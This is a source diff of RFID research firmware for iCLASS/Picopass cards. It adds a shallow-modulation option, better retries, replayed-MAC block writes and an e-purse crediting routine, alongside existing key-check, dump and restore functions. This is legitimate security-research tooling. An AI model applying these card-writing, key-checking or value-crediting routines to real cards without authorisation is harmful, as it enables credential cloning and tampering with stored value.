@@ -36,38 +36,17 @@
 #include "protocols.h"
 #include "ticks.h"
 #include "iso15693.h"
-#include "iclass_cmd.h"              /* iclass_card_select_t struct */
+#include "iclass_cmd.h"              // iclass_card_select_t struct
+#include "i2c.h"                     // i2c defines (SIM module access)
 
-static uint8_t get_pagemap(const picopass_hdr_t *hdr) {
+uint8_t get_pagemap(const picopass_hdr_t *hdr) {
     return (hdr->conf.fuses & (FUSE_CRYPT0 | FUSE_CRYPT1)) >> 3;
 }
 
-// The length of a received command will in most cases be no more than 18 bytes.
-// we expect max 34 (32+2) bytes as tag answer (response to READ4)
-#ifndef ICLASS_BUFFER_SIZE
-#define ICLASS_BUFFER_SIZE     34 + 2
-#endif
 
 #ifndef ICLASS_16KS_SIZE
 #define ICLASS_16KS_SIZE       0x100 * 8
 #endif
-
-// iCLASS has a slightly different timing compared to ISO15693. According to the picopass data sheet the tag response is expected 330us after
-// the reader command. This is measured from end of reader EOF to first modulation of the tag's SOF which starts with a 56,64us unmodulated period.
-// 330us = 140 ssp_clk cycles @ 423,75kHz when simulating.
-// 56,64us = 24 ssp_clk_cycles
-#define DELAY_ICLASS_VCD_TO_VICC_SIM     (140 - 26) // (140 - 24)
-
-// times in ssp_clk_cycles @ 3,3625MHz when acting as reader
-#define DELAY_ICLASS_VICC_TO_VCD_READER  DELAY_ISO15693_VICC_TO_VCD_READER
-
-// times in samples @ 212kHz when acting as reader
-#define ICLASS_READER_TIMEOUT_ACTALL     330 // 1558us, nominal 330us + 7slots*160us = 1450us
-#define ICLASS_READER_TIMEOUT_UPDATE    3390 // 16000us, nominal 4-15ms
-#define ICLASS_READER_TIMEOUT_OTHERS      80 // 380us, nominal 330us
-
-#define AddCrc(data, len) compute_crc(CRC_ICLASS, (data), (len), (data)+(len), (data)+(len)+1)
-
 
 /*
 * CARD TO READER
@@ -91,7 +70,7 @@ static uint8_t get_pagemap(const picopass_hdr_t *hdr) {
 // Both sides of communication!
 //=============================================================================
 void SniffIClass(uint8_t jam_search_len, uint8_t *jam_search_string) {
-    SniffIso15693(jam_search_len, jam_search_string);
+    SniffIso15693(jam_search_len, jam_search_string, true);
 }
 
 static void rotateCSN(const uint8_t *original_csn, uint8_t *rotated_csn) {
@@ -1245,28 +1224,37 @@ send:
 }
 
 // THE READER CODE
-static void iclass_send_as_reader(uint8_t *frame, int len, uint32_t *start_time, uint32_t *end_time) {
+void iclass_send_as_reader(uint8_t *frame, int len, uint32_t *start_time, uint32_t *end_time, bool shallow_mod) {
     CodeIso15693AsReader(frame, len);
     tosend_t *ts = get_tosend();
-    TransmitTo15693Tag(ts->buf, ts->max, start_time);
+    TransmitTo15693Tag(ts->buf, ts->max, start_time, shallow_mod);
     *end_time = *start_time + (32 * ((8 * ts->max) - 4)); // subtract the 4 padding bits after EOF
     LogTrace_ISO15693(frame, len, (*start_time * 4), (*end_time * 4), NULL, true);
 }
 
 static bool iclass_send_cmd_with_retries(uint8_t *cmd, size_t cmdsize, uint8_t *resp, size_t max_resp_size,
                                          uint8_t expected_size, uint8_t tries, uint32_t *start_time,
-                                         uint16_t timeout, uint32_t *eof_time) {
+                                         uint16_t timeout, uint32_t *eof_time, bool shallow_mod) {
+
+    uint16_t resp_len = 0;
     while (tries-- > 0) {
 
-        iclass_send_as_reader(cmd, cmdsize, start_time, eof_time);
+        iclass_send_as_reader(cmd, cmdsize, start_time, eof_time, shallow_mod);
 
         if (resp == NULL) {
             return true;
         }
 
-        if (expected_size == GetIso15693AnswerFromTag(resp, max_resp_size, timeout, eof_time)) {
+        int res = GetIso15693AnswerFromTag(resp, max_resp_size, timeout, eof_time, false, true, &resp_len);
+        if (res == PM3_SUCCESS && expected_size == resp_len) {
             return true;
         }
+
+        // Timed out waiting for the tag to reply, but perhaps the tag did hear the command and is attempting to reply
+        // So wait long enough for the tag to encode it's reply plus required frame delays on each side before retrying
+        // And then double it, because in practice it seems to make it much more likely to succeed
+        // Response time calculation from expected_size lifted from GetIso15693AnswerFromTag
+        *start_time = *eof_time + ((DELAY_ICLASS_VICC_TO_VCD_READER + DELAY_ISO15693_VCD_TO_VICC_READER + (expected_size * 8 * 8 * 16)) * 2);
     }
     return false;
 }
@@ -1278,7 +1266,7 @@ static bool iclass_send_cmd_with_retries(uint8_t *cmd, size_t cmdsize, uint8_t *
  * @return false = fail
  *         true = Got all.
  */
-static bool select_iclass_tag_ex(picopass_hdr_t *hdr, bool use_credit_key, uint32_t *eof_time, uint8_t *status) {
+static bool select_iclass_tag_ex(picopass_hdr_t *hdr, bool use_credit_key, uint32_t *eof_time, uint8_t *status, bool shallow_mod) {
 
     static uint8_t act_all[] = { ICLASS_CMD_ACTALL };
     static uint8_t identify[] = { ICLASS_CMD_READ_OR_IDENTIFY, 0x00, 0x73, 0x33 };
@@ -1295,18 +1283,20 @@ static bool select_iclass_tag_ex(picopass_hdr_t *hdr, bool use_credit_key, uint3
 
     // wakeup
     uint32_t start_time = GetCountSspClk();
-    iclass_send_as_reader(act_all, 1, &start_time, eof_time);
-    int len = GetIso15693AnswerFromTag(resp, sizeof(resp), ICLASS_READER_TIMEOUT_ACTALL, eof_time);
-    if (len < 0)
+    iclass_send_as_reader(act_all, 1, &start_time, eof_time, shallow_mod);
+    int res;
+    uint16_t resp_len = 0;
+    res = GetIso15693AnswerFromTag(resp, sizeof(resp), ICLASS_READER_TIMEOUT_ACTALL, eof_time, false, true, &resp_len);
+    if (res != PM3_SUCCESS)
         return false;
 
     // send Identify
     start_time = *eof_time + DELAY_ICLASS_VICC_TO_VCD_READER;
-    iclass_send_as_reader(identify, 1, &start_time, eof_time);
+    iclass_send_as_reader(identify, 1, &start_time, eof_time, shallow_mod);
 
     // expect a 10-byte response here, 8 byte anticollision-CSN and 2 byte CRC
-    len = GetIso15693AnswerFromTag(resp, sizeof(resp), ICLASS_READER_TIMEOUT_OTHERS, eof_time);
-    if (len != 10)
+    res = GetIso15693AnswerFromTag(resp, sizeof(resp), ICLASS_READER_TIMEOUT_OTHERS, eof_time, false, true, &resp_len);
+    if (res != PM3_SUCCESS || resp_len != 10)
         return false;
 
     // copy the Anti-collision CSN to our select-packet
@@ -1314,11 +1304,11 @@ static bool select_iclass_tag_ex(picopass_hdr_t *hdr, bool use_credit_key, uint3
 
     // select the card
     start_time = *eof_time + DELAY_ICLASS_VICC_TO_VCD_READER;
-    iclass_send_as_reader(select, sizeof(select), &start_time, eof_time);
+    iclass_send_as_reader(select, sizeof(select), &start_time, eof_time, shallow_mod);
 
     // expect a 10-byte response here, 8 byte CSN and 2 byte CRC
-    len = GetIso15693AnswerFromTag(resp, sizeof(resp), ICLASS_READER_TIMEOUT_OTHERS, eof_time);
-    if (len != 10)
+    res = GetIso15693AnswerFromTag(resp, sizeof(resp), ICLASS_READER_TIMEOUT_OTHERS, eof_time, false, true, &resp_len);
+    if (res != PM3_SUCCESS || resp_len != 10)
         return false;
 
     // save CSN
@@ -1326,11 +1316,11 @@ static bool select_iclass_tag_ex(picopass_hdr_t *hdr, bool use_credit_key, uint3
 
     // card selected, now read config (block1) (only 8 bytes no CRC)
     start_time = *eof_time + DELAY_ICLASS_VICC_TO_VCD_READER;
-    iclass_send_as_reader(read_conf, sizeof(read_conf), &start_time, eof_time);
+    iclass_send_as_reader(read_conf, sizeof(read_conf), &start_time, eof_time, shallow_mod);
 
     // expect a 8-byte response here
-    len = GetIso15693AnswerFromTag(resp, sizeof(resp), ICLASS_READER_TIMEOUT_OTHERS, eof_time);
-    if (len != 10)
+    res = GetIso15693AnswerFromTag(resp, sizeof(resp), ICLASS_READER_TIMEOUT_OTHERS, eof_time, false, true, &resp_len);
+    if (res != PM3_SUCCESS || resp_len != 10)
         return false;
 
     // save CONF
@@ -1344,11 +1334,11 @@ static bool select_iclass_tag_ex(picopass_hdr_t *hdr, bool use_credit_key, uint3
 
         // read App Issuer Area block 5
         start_time = *eof_time + DELAY_ICLASS_VICC_TO_VCD_READER;
-        iclass_send_as_reader(read_aia, sizeof(read_aia), &start_time, eof_time);
+        iclass_send_as_reader(read_aia, sizeof(read_aia), &start_time, eof_time, shallow_mod);
 
         // expect a 10-byte response here
-        len = GetIso15693AnswerFromTag(resp, sizeof(resp), ICLASS_READER_TIMEOUT_OTHERS, eof_time);
-        if (len != 10)
+        res = GetIso15693AnswerFromTag(resp, sizeof(resp), ICLASS_READER_TIMEOUT_OTHERS, eof_time, false, true, &resp_len);
+        if (res != PM3_SUCCESS || resp_len != 10)
             return false;
 
         if (status) {
@@ -1358,11 +1348,11 @@ static bool select_iclass_tag_ex(picopass_hdr_t *hdr, bool use_credit_key, uint3
 
         // card selected, now read e-purse (cc) (block2) (only 8 bytes no CRC)
         start_time = *eof_time + DELAY_ICLASS_VICC_TO_VCD_READER;
-        iclass_send_as_reader(read_check_cc, sizeof(read_check_cc), &start_time, eof_time);
+        iclass_send_as_reader(read_check_cc, sizeof(read_check_cc), &start_time, eof_time, shallow_mod);
 
         // expect a 8-byte response here
-        len = GetIso15693AnswerFromTag(resp, sizeof(resp), ICLASS_READER_TIMEOUT_OTHERS, eof_time);
-        if (len != 8)
+        res = GetIso15693AnswerFromTag(resp, sizeof(resp), ICLASS_READER_TIMEOUT_OTHERS, eof_time, false, true, &resp_len);
+        if (res != PM3_SUCCESS || resp_len != 8)
             return false;
 
         memcpy(hdr->epurse, resp, sizeof(hdr->epurse));
@@ -1380,11 +1370,11 @@ static bool select_iclass_tag_ex(picopass_hdr_t *hdr, bool use_credit_key, uint3
         read_aia[3] = 0x10;
 
         start_time = *eof_time + DELAY_ICLASS_VICC_TO_VCD_READER;
-        iclass_send_as_reader(read_aia, sizeof(read_aia), &start_time, eof_time);
+        iclass_send_as_reader(read_aia, sizeof(read_aia), &start_time, eof_time, shallow_mod);
 
         // expect a 10-byte response here
-        len = GetIso15693AnswerFromTag(resp, sizeof(resp), ICLASS_READER_TIMEOUT_OTHERS, eof_time);
-        if (len != 10)
+        res = GetIso15693AnswerFromTag(resp, sizeof(resp), ICLASS_READER_TIMEOUT_OTHERS, eof_time, false, true, &resp_len);
+        if (res != PM3_SUCCESS || resp_len != 10)
             return false;
 
         if (status) {
@@ -1396,9 +1386,9 @@ static bool select_iclass_tag_ex(picopass_hdr_t *hdr, bool use_credit_key, uint3
     return true;
 }
 
-bool select_iclass_tag(picopass_hdr_t *hdr, bool use_credit_key, uint32_t *eof_time) {
+bool select_iclass_tag(picopass_hdr_t *hdr, bool use_credit_key, uint32_t *eof_time, bool shallow_mod) {
     uint8_t result = 0;
-    return select_iclass_tag_ex(hdr, use_credit_key, eof_time, &result);
+    return select_iclass_tag_ex(hdr, use_credit_key, eof_time, &result, shallow_mod);
 }
 
 // Reader iClass Anticollission
@@ -1407,6 +1397,7 @@ void ReaderIClass(uint8_t flags) {
 
     // flag to use credit key
     bool use_credit_key = ((flags & FLAG_ICLASS_READER_CREDITKEY) == FLAG_ICLASS_READER_CREDITKEY);
+    bool shallow_mod = (flags & FLAG_ICLASS_READER_SHALLOW_MOD);
 
     if ((flags & FLAG_ICLASS_READER_INIT) == FLAG_ICLASS_READER_INIT) {
         Iso15693InitReader();
@@ -1421,7 +1412,7 @@ void ReaderIClass(uint8_t flags) {
     uint32_t eof_time = 0;
     picopass_hdr_t hdr = {0};
 
-    if (select_iclass_tag_ex(&hdr, use_credit_key, &eof_time, &res) == false) {
+    if (select_iclass_tag_ex(&hdr, use_credit_key, &eof_time, &res, shallow_mod) == false) {
         reply_ng(CMD_HF_ICLASS_READER, PM3_ERFTRANS, NULL, 0);
         goto out;
     }
@@ -1492,7 +1483,7 @@ bool authenticate_iclass_tag(iclass_auth_req_t *payload, picopass_hdr_t *hdr, ui
         cmd_check[7] = pmac[2];
         cmd_check[8] = pmac[3];
     }
-    return iclass_send_cmd_with_retries(cmd_check, sizeof(cmd_check), resp_auth, sizeof(resp_auth), 4, 2, start_time, ICLASS_READER_TIMEOUT_OTHERS, eof_time);
+    return iclass_send_cmd_with_retries(cmd_check, sizeof(cmd_check), resp_auth, sizeof(resp_auth), 4, 2, start_time, ICLASS_READER_TIMEOUT_OTHERS, eof_time, payload->shallow_mod);
 }
 
 
@@ -1509,6 +1500,8 @@ void iClass_Authentication_fast(iclass_chk_t *p) {
         reply_ng(CMD_HF_ICLASS_CHKKEYS, PM3_ESOFT, NULL, 0);
         return;
     }
+
+    bool shallow_mod = p->shallow_mod;
 
     uint8_t check[9] = { ICLASS_CMD_CHECK };
     uint8_t resp[ICLASS_BUFFER_SIZE] = {0};
@@ -1531,7 +1524,7 @@ void iClass_Authentication_fast(iclass_chk_t *p) {
     bool isOK = false;
 
     uint32_t start_time = 0, eof_time = 0;
-    if (select_iclass_tag(&hdr, p->use_credit_key, &eof_time) == false)
+    if (select_iclass_tag(&hdr, p->use_credit_key, &eof_time, shallow_mod) == false)
         goto out;
 
     start_time = eof_time + DELAY_ICLASS_VICC_TO_VCD_READER;
@@ -1560,14 +1553,14 @@ void iClass_Authentication_fast(iclass_chk_t *p) {
         check[8] = keys[i].mac[3];
 
         // expect 4bytes, 3 retries times..
-        isOK = iclass_send_cmd_with_retries(check, sizeof(check), resp, sizeof(resp), 4, 2, &start_time, ICLASS_READER_TIMEOUT_OTHERS, &eof_time);
+        isOK = iclass_send_cmd_with_retries(check, sizeof(check), resp, sizeof(resp), 4, 2, &start_time, ICLASS_READER_TIMEOUT_OTHERS, &eof_time, shallow_mod);
         if (isOK)
             goto out;
 
         start_time = eof_time + DELAY_ICLASS_VICC_TO_VCD_READER;
         // Auth Sequence MUST begin with reading e-purse. (block2)
         // Card selected, now read e-purse (cc) (block2) (only 8 bytes no CRC)
-        iclass_send_as_reader(readcheck_cc, sizeof(readcheck_cc), &start_time, &eof_time);
+        iclass_send_as_reader(readcheck_cc, sizeof(readcheck_cc), &start_time, &eof_time, shallow_mod);
         LED_B_OFF();
     }
 
@@ -1580,11 +1573,11 @@ out:
 // Tries to read block.
 // retries 3times.
 // reply 8 bytes block
-bool iclass_read_block(uint16_t blockno, uint8_t *data, uint32_t *start_time, uint32_t *eof_time) {
+bool iclass_read_block(uint16_t blockno, uint8_t *data, uint32_t *start_time, uint32_t *eof_time, bool shallow_mod) {
     uint8_t resp[10];
     uint8_t c[] = {ICLASS_CMD_READ_OR_IDENTIFY, blockno, 0x00, 0x00};
     AddCrc(c + 1, 1);
-    bool isOK = iclass_send_cmd_with_retries(c, sizeof(c), resp, sizeof(resp), 10, 2, start_time, ICLASS_READER_TIMEOUT_OTHERS, eof_time);
+    bool isOK = iclass_send_cmd_with_retries(c, sizeof(c), resp, sizeof(resp), 10, 2, start_time, ICLASS_READER_TIMEOUT_OTHERS, eof_time, shallow_mod);
     if (isOK)
         memcpy(data, resp, 8);
     return isOK;
@@ -1596,6 +1589,7 @@ bool iclass_read_block(uint16_t blockno, uint8_t *data, uint32_t *start_time, ui
 void iClass_ReadBlock(uint8_t *msg) {
 
     iclass_auth_req_t *payload = (iclass_auth_req_t *)msg;
+    bool shallow_mod = payload->shallow_mod;
 
     iclass_readblock_resp_t response = { .isOK = true };
     memset(response.data, 0, sizeof(response.data));
@@ -1608,7 +1602,7 @@ void iClass_ReadBlock(uint8_t *msg) {
     // select tag.
     uint32_t eof_time = 0;
     picopass_hdr_t hdr = {0};
-    bool res = select_iclass_tag(&hdr, payload->use_credit_key, &eof_time);
+    bool res = select_iclass_tag(&hdr, payload->use_credit_key, &eof_time, shallow_mod);
     if (res == false) {
         if (payload->send_reply) {
             response.isOK = res;
@@ -1636,7 +1630,7 @@ void iClass_ReadBlock(uint8_t *msg) {
 
     // read data
     uint8_t resp[10];
-    res = iclass_send_cmd_with_retries(cmd_read, sizeof(cmd_read), resp, sizeof(resp), 10, 3, &start_time, ICLASS_READER_TIMEOUT_OTHERS, &eof_time);
+    res = iclass_send_cmd_with_retries(cmd_read, sizeof(cmd_read), resp, sizeof(resp), 10, 3, &start_time, ICLASS_READER_TIMEOUT_OTHERS, &eof_time, shallow_mod);
     if (res) {
         memcpy(response.data, resp, sizeof(response.data));
         if (payload->send_reply) {
@@ -1664,6 +1658,7 @@ void iClass_Dump(uint8_t *msg) {
 
     iclass_dump_req_t *cmd = (iclass_dump_req_t *)msg;
     iclass_auth_req_t *req = &cmd->req;
+    bool shallow_mod = req->shallow_mod;
 
     uint8_t *dataout = BigBuf_malloc(ICLASS_16KS_SIZE);
     if (dataout == NULL) {
@@ -1683,7 +1678,7 @@ void iClass_Dump(uint8_t *msg) {
     picopass_hdr_t hdr = {0};
     memset(&hdr, 0xff, sizeof(picopass_hdr_t));
 
-    bool res = select_iclass_tag(&hdr, req->use_credit_key, &eof_time);
+    bool res = select_iclass_tag(&hdr, req->use_credit_key, &eof_time, shallow_mod);
     if (res == false) {
         if (req->send_reply) {
             reply_ng(CMD_HF_ICLASS_DUMP, PM3_ETIMEOUT, NULL, 0);
@@ -1718,7 +1713,7 @@ void iClass_Dump(uint8_t *msg) {
         uint8_t c[] = {ICLASS_CMD_READ_OR_IDENTIFY, i, 0x00, 0x00};
         AddCrc(c + 1, 1);
 
-        res = iclass_send_cmd_with_retries(c, sizeof(c), resp, sizeof(resp), 10, 3, &start_time, ICLASS_READER_TIMEOUT_OTHERS, &eof_time);
+        res = iclass_send_cmd_with_retries(c, sizeof(c), resp, sizeof(resp), 10, 3, &start_time, ICLASS_READER_TIMEOUT_OTHERS, &eof_time, shallow_mod);
         if (res) {
             memcpy(dataout + (8 * i), resp, 8);
         } else {
@@ -1745,7 +1740,7 @@ void iClass_Dump(uint8_t *msg) {
         } PACKED response;
 
         response.isOK = dumpsuccess;
-        response.block_cnt = i;
+        response.block_cnt = i - cmd->start_block;
         response.bb_offset = dataout - BigBuf_get_addr();
         reply_ng(CMD_HF_ICLASS_DUMP, PM3_SUCCESS, (uint8_t *)&response, sizeof(response));
     }
@@ -1753,7 +1748,7 @@ void iClass_Dump(uint8_t *msg) {
     BigBuf_free();
 }
 
-static bool iclass_writeblock_ext(uint8_t blockno, uint8_t *data, uint8_t *mac, bool use_mac) {
+static bool iclass_writeblock_ext(uint8_t blockno, uint8_t *data, uint8_t *mac, bool use_mac, bool shallow_mod) {
 
     // write command: cmd, 1 blockno, 8 data, 4 mac
     uint8_t write[14] = { 0x80 | ICLASS_CMD_UPDATE, blockno };
@@ -1769,12 +1764,11 @@ static bool iclass_writeblock_ext(uint8_t blockno, uint8_t *data, uint8_t *mac, 
 
     uint8_t resp[10] = {0};
     uint32_t eof_time = 0, start_time = 0;
-    bool isOK = iclass_send_cmd_with_retries(write, write_len, resp, sizeof(resp), 10, 3, &start_time, ICLASS_READER_TIMEOUT_UPDATE, &eof_time);
+    bool isOK = iclass_send_cmd_with_retries(write, write_len, resp, sizeof(resp), 10, 3, &start_time, ICLASS_READER_TIMEOUT_UPDATE, &eof_time, shallow_mod);
     if (isOK == false) {
         return false;
     }
 
-    uint8_t all_ff[8] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
     if (blockno == 2) {
         // check response. e-purse update swaps first and second half
         if (memcmp(data + 4, resp, 4) || memcmp(data, resp + 4, 4)) {
@@ -1782,6 +1776,7 @@ static bool iclass_writeblock_ext(uint8_t blockno, uint8_t *data, uint8_t *mac, 
         }
     } else if (blockno == 3 || blockno == 4) {
         // check response. Key updates always return 0xffffffffffffffff
+        uint8_t all_ff[8] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
         if (memcmp(all_ff, resp, 8)) {
             return false;
         }
@@ -1801,6 +1796,7 @@ void iClass_WriteBlock(uint8_t *msg) {
     LED_A_ON();
 
     iclass_writeblock_req_t *payload = (iclass_writeblock_req_t *)msg;
+    bool shallow_mod = payload->req.shallow_mod;
 
     uint8_t write[14] = { 0x80 | ICLASS_CMD_UPDATE, payload->req.blockno };
     uint8_t write_len = 14;
@@ -1810,7 +1806,7 @@ void iClass_WriteBlock(uint8_t *msg) {
     // select tag.
     uint32_t eof_time = 0;
     picopass_hdr_t hdr = {0};
-    uint8_t res = select_iclass_tag(&hdr, payload->req.use_credit_key, &eof_time);
+    bool res = select_iclass_tag(&hdr, payload->req.use_credit_key, &eof_time, shallow_mod);
     if (res == false) {
         goto out;
     }
@@ -1840,17 +1836,22 @@ void iClass_WriteBlock(uint8_t *msg) {
         AddCrc(write + 1, 9);
         write_len -= 2;
     } else {
-        // Secure tags uses MAC
-        uint8_t wb[9];
-        wb[0] = payload->req.blockno;
-        memcpy(wb + 1, payload->data, 8);
 
-        if (payload->req.use_credit_key)
-            doMAC_N(wb, sizeof(wb), hdr.key_c, mac);
-        else
-            doMAC_N(wb, sizeof(wb), hdr.key_d, mac);
+        if (payload->req.use_replay) {
+            memcpy(write + 10, payload->mac, sizeof(payload->mac));
+        } else {
+            // Secure tags uses MAC
+            uint8_t wb[9];
+            wb[0] = payload->req.blockno;
+            memcpy(wb + 1, payload->data, 8);
 
-        memcpy(write + 10, mac, sizeof(mac));
+            if (payload->req.use_credit_key)
+                doMAC_N(wb, sizeof(wb), hdr.key_c, mac);
+            else
+                doMAC_N(wb, sizeof(wb), hdr.key_d, mac);
+
+            memcpy(write + 10, mac, sizeof(mac));
+        }
     }
 
     start_time = eof_time + DELAY_ICLASS_VICC_TO_VCD_READER;
@@ -1860,17 +1861,20 @@ void iClass_WriteBlock(uint8_t *msg) {
     uint8_t tries = 3;
     while (tries-- > 0) {
 
-        iclass_send_as_reader(write, write_len, &start_time, &eof_time);
+        iclass_send_as_reader(write, write_len, &start_time, &eof_time, shallow_mod);
 
         if (tearoff_hook() == PM3_ETEAROFF) { // tearoff occurred
             res = false;
             switch_off();
-            if (payload->req.send_reply)
-                reply_ng(CMD_HF_ICLASS_WRITEBL, PM3_ETEAROFF, (uint8_t *)&res, sizeof(uint8_t));
+            if (payload->req.send_reply) {
+                reply_ng(CMD_HF_ICLASS_WRITEBL, PM3_ETEAROFF, (uint8_t *)&res, sizeof(bool));
+            }
             return;
         } else {
 
-            if (GetIso15693AnswerFromTag(resp, sizeof(resp), ICLASS_READER_TIMEOUT_UPDATE, &eof_time) == 10) {
+            uint16_t resp_len = 0;
+            int res2 = GetIso15693AnswerFromTag(resp, sizeof(resp), ICLASS_READER_TIMEOUT_UPDATE, &eof_time, false, true, &resp_len);
+            if (res2 == PM3_SUCCESS && resp_len == 10) {
                 res = true;
                 break;
             }
@@ -1883,16 +1887,16 @@ void iClass_WriteBlock(uint8_t *msg) {
     }
 
     // verify write
-    uint8_t all_ff[8] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
-    if (payload->req.blockno == 2) {
+    if ((pagemap != PICOPASS_NON_SECURE_PAGEMODE) && (payload->req.blockno == 2)) {
         // check response. e-purse update swaps first and second half
         if (memcmp(payload->data + 4, resp, 4) || memcmp(payload->data, resp + 4, 4)) {
             res = false;
             goto out;
         }
-    } else if (payload->req.blockno == 3 || payload->req.blockno == 4) {
+    } else if ((pagemap != PICOPASS_NON_SECURE_PAGEMODE) && (payload->req.blockno == 3 || payload->req.blockno == 4)) {
         // check response. Key updates always return 0xffffffffffffffff
-        if (memcmp(all_ff, resp, 8)) {
+        uint8_t all_ff[8] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
+        if (memcmp(all_ff, resp, sizeof(all_ff))) {
             res = false;
             goto out;
         }
@@ -1907,8 +1911,163 @@ void iClass_WriteBlock(uint8_t *msg) {
 out:
     switch_off();
 
+    if (payload->req.send_reply) {
+        reply_ng(CMD_HF_ICLASS_WRITEBL, PM3_SUCCESS, (uint8_t *)&res, sizeof(bool));
+    }
+}
+
+void iclass_credit_epurse(iclass_credit_epurse_t *payload) {
+
+    LED_A_ON();
+
+    bool shallow_mod = payload->req.shallow_mod;
+
+    Iso15693InitReader();
+
+    // select tag.
+    uint32_t eof_time = 0;
+    picopass_hdr_t hdr = {0};
+    uint8_t res = select_iclass_tag(&hdr, payload->req.use_credit_key, &eof_time, shallow_mod);
+    if (res == false) {
+        goto out;
+    }
+
+    uint32_t start_time = eof_time + DELAY_ICLASS_VICC_TO_VCD_READER;
+
+    uint8_t mac[4] = {0};
+
+    // authenticate
+    if (payload->req.do_auth) {
+
+        res = authenticate_iclass_tag(&payload->req, &hdr, &start_time, &eof_time, mac);
+        if (res == false) {
+            goto out;
+        }
+    }
+
+    start_time = eof_time + DELAY_ICLASS_VICC_TO_VCD_READER;
+
+    uint8_t cmd_read[] = {ICLASS_CMD_READ_OR_IDENTIFY, payload->req.blockno, 0x00, 0x00};
+    AddCrc(cmd_read + 1, 1);
+
+    uint8_t epurse[10];
+    res = iclass_send_cmd_with_retries(cmd_read, sizeof(cmd_read), epurse, sizeof(epurse), 10, 3, &start_time, ICLASS_READER_TIMEOUT_OTHERS, &eof_time, shallow_mod);
+    if (!res) {
+        switch_off();
+        if (payload->req.send_reply) {
+            reply_ng(CMD_HF_ICLASS_CREDIT_EPURSE, PM3_ETIMEOUT, (uint8_t *)&res, sizeof(uint8_t));
+        }
+        return;
+    }
+
+    uint8_t write[14] = { 0x80 | ICLASS_CMD_UPDATE, payload->req.blockno };
+    uint8_t write_len = 14;
+
+    uint8_t epurse_offset = 0;
+    const uint8_t empty_epurse[] = {0xff, 0xff, 0xff, 0xff};
+    if (memcmp(epurse, empty_epurse, 4) == 0) {
+        // epurse data in stage 2
+        epurse_offset = 4;
+    }
+
+    memcpy(epurse + epurse_offset, payload->epurse, 4);
+
+    // blank out debiting value as per the first step of the crediting procedure
+    epurse[epurse_offset + 0] = 0xFF;
+    epurse[epurse_offset + 1] = 0xFF;
+
+    // initial epurse write for credit
+    memcpy(write + 2, epurse, 8);
+
+    doMAC_N(write + 1, 9, payload->req.use_credit_key ? hdr.key_c : hdr.key_d, mac);
+    memcpy(write + 10, mac, sizeof(mac));
+
+    start_time = eof_time + DELAY_ICLASS_VICC_TO_VCD_READER;
+
+    uint8_t resp[10] = {0};
+
+    uint8_t tries = 3;
+    while (tries-- > 0) {
+
+        iclass_send_as_reader(write, write_len, &start_time, &eof_time, shallow_mod);
+
+        if (tearoff_hook() == PM3_ETEAROFF) { // tearoff occurred
+            res = false;
+            switch_off();
+            if (payload->req.send_reply)
+                reply_ng(CMD_HF_ICLASS_CREDIT_EPURSE, PM3_ETEAROFF, (uint8_t *)&res, sizeof(uint8_t));
+            return;
+        } else {
+
+            uint16_t resp_len = 0;
+            int res2 = GetIso15693AnswerFromTag(resp, sizeof(resp), ICLASS_READER_TIMEOUT_UPDATE, &eof_time, false, true, &resp_len);
+            if (res2 == PM3_SUCCESS && resp_len == 10) {
+                res = true;
+                break;
+            }
+        }
+    }
+
+    if (tries == 0) {
+        res = false;
+        goto out;
+    }
+
+    // check response. e-purse update swaps first and second half
+    if (memcmp(write + 2 + 4, resp, 4) || memcmp(write + 2, resp + 4, 4)) {
+        res = false;
+        goto out;
+    }
+
+    // new epurse write
+    // epurse offset is now flipped after the first write
+    epurse_offset ^= 4;
+    memcpy(resp + epurse_offset, payload->epurse, 4);
+    memcpy(write + 2, resp, 8);
+
+    doMAC_N(write + 1, 9, payload->req.use_credit_key ? hdr.key_c : hdr.key_d, mac);
+    memcpy(write + 10, mac, sizeof(mac));
+
+    start_time = eof_time + DELAY_ICLASS_VICC_TO_VCD_READER;
+
+    tries = 3;
+    while (tries-- > 0) {
+
+        iclass_send_as_reader(write, write_len, &start_time, &eof_time, shallow_mod);
+
+        if (tearoff_hook() == PM3_ETEAROFF) { // tearoff occurred
+            res = false;
+            switch_off();
+            if (payload->req.send_reply)
+                reply_ng(CMD_HF_ICLASS_CREDIT_EPURSE, PM3_ETEAROFF, (uint8_t *)&res, sizeof(uint8_t));
+            return;
+        } else {
+
+            uint16_t resp_len = 0;
+            int res2 = GetIso15693AnswerFromTag(resp, sizeof(resp), ICLASS_READER_TIMEOUT_UPDATE, &eof_time, false, true, &resp_len);
+            if (res2 == PM3_SUCCESS && resp_len == 10) {
+                res = true;
+                break;
+            }
+        }
+    }
+
+    if (tries == 0) {
+        res = false;
+        goto out;
+    }
+
+    // check response. e-purse update swaps first and second half
+    if (memcmp(write + 2 + 4, resp, 4) || memcmp(write + 2, resp + 4, 4)) {
+        res = false;
+        goto out;
+    }
+
+out:
+    switch_off();
+
     if (payload->req.send_reply)
-        reply_ng(CMD_HF_ICLASS_WRITEBL, PM3_SUCCESS, (uint8_t *)&res, sizeof(uint8_t));
+        reply_ng(CMD_HF_ICLASS_CREDIT_EPURSE, PM3_SUCCESS, (uint8_t *)&res, sizeof(uint8_t));
 }
 
 void iClass_Restore(iclass_restore_req_t *msg) {
@@ -1926,6 +2085,8 @@ void iClass_Restore(iclass_restore_req_t *msg) {
         return;
     }
 
+    bool shallow_mod = msg->req.shallow_mod;
+
     LED_A_ON();
     Iso15693InitReader();
 
@@ -1934,7 +2095,7 @@ void iClass_Restore(iclass_restore_req_t *msg) {
     picopass_hdr_t hdr = {0};
 
     // select
-    bool res = select_iclass_tag(&hdr, msg->req.use_credit_key, &eof_time);
+    bool res = select_iclass_tag(&hdr, msg->req.use_credit_key, &eof_time, shallow_mod);
     if (res == false) {
         goto out;
     }
@@ -1975,7 +2136,7 @@ void iClass_Restore(iclass_restore_req_t *msg) {
         }
 
         // data + mac
-        if (iclass_writeblock_ext(item.blockno, item.data, mac, use_mac)) {
+        if (iclass_writeblock_ext(item.blockno, item.data, mac, use_mac, shallow_mod)) {
             Dbprintf("Write block [%3d/0x%02X] " _GREEN_("successful"), item.blockno, item.blockno);
             written++;
         } else {
@@ -1990,4 +2151,217 @@ out:
         int isOK = (written == msg->item_cnt) ? PM3_SUCCESS : PM3_ESOFT;
         reply_ng(CMD_HF_ICLASS_RESTORE, isOK, NULL, 0);
     }
+}
+
